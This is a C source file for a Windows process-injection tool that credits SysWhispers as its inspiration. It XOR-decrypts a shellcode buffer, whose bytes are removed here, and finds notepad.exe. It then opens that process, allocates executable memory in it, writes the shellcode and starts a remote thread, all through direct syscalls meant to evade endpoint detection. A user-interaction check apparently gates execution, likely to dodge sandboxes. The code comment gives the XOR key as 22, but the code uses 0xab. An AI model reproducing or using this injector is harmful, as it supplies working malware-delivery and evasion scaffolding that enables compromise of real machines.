// Inspired from: https://github.com/jthuraisamy/SysWhispers

#include "stdio.h"
#include "Windows.h"
#include "..\functions.h"
#include "syscalls.h"

int main(int argc, char* argv[])
{
	ULONG  old;
	HANDLE processHandle;
	HANDLE hThread = NULL;
	LPVOID lpAllocationStart = NULL;
	SIZE_T szAllocationSize;
	DWORD pid;

	/* length: 927 bytes */
	//unsigned char buf[] = "<removed>";

	// Shellcode encrypted with XOR (key=22)
	unsigned char buf[] = "<removed>"
	szAllocationSize = sizeof(buf);

	int ret = insert_user_interaction();

	if (ret == 1) {
		// Decrypt shellcode
		for (int x = 0; x < 927; x++) {
			*((char*)buf + x) = *((char*)buf + x) ^ '\xab';
		}

		// Resolve pid from name
		pid = FindProcessId(L"notepad.exe");

		if (pid == 0) {
			printf("Could not find process. Have you started notepad.exe?\n");
			return 1;
		}

		// Get handle to process
		printf("Injecting to PID: %i", pid);
		//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		OBJECT_ATTRIBUTES attribs;
		InitializeObjectAttributes(&attribs, NULL, NULL, NULL, NULL, NULL);
		CLIENT_ID cid = { (HANDLE)pid, NULL };
		NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &attribs, &cid);

		/* allocate memory in our process */
		//lpAllocationStart = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);
		NtAllocateVirtualMemory(processHandle, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		/* write our shellcode to the process */
		//WriteProcessMemory(hProcess, lpAllocationStart, buffer, (SIZE_T)length, (SIZE_T*)&wrote);
		//if (wrote != length)
		//	return;
		NtWriteVirtualMemory(processHandle, lpAllocationStart, (PVOID)buf, 927, NULL);

		/* change permissions */
		//VirtualProtectEx(hProcess, lpAllocationStart, length, PAGE_EXECUTE_READ, &old);
		//NtProtectVirtualMemory(processHandle, &lpAllocationStart, (PULONG)&szAllocationSize, PAGE_EXECUTE_READ, &old);

		/* create a thread in the process */
		//CreateRemoteThread(hProcess, NULL, 0, lpAllocationStart, NULL, 0, NULL);
		NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, 0);
	}

	return 0;
}
